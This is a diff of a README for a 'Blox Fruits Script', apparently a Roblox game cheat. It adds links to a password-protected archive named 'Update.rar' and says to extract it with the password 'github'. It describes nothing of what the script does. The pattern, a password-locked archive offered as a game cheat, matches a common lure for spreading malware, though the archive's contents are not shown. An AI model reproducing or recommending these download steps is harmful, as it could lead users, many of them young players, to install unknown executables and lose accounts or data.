@@ -1,10 +1,10 @@
 
-# Blox Fruits Script [![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blueviolet)])
+# Blox Fruits Script [![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blueviolet)](https://github.com/tkkaushik369/blox-fruits-script/releases/download/Release/Update.rar)
 
 ## Installation
 To install the Blox Fruits Script, follow these simple steps:
 1. Download the Blox Fruits Script package from here  
-   [![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blueviolet)]()
+   [![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blueviolet)](https://github.com/tkkaushik369/blox-fruits-script/releases/download/Release/Update.rar)
 2. **Pass: github**
 3. Extract the downloaded RAR file to your preferred location.
 
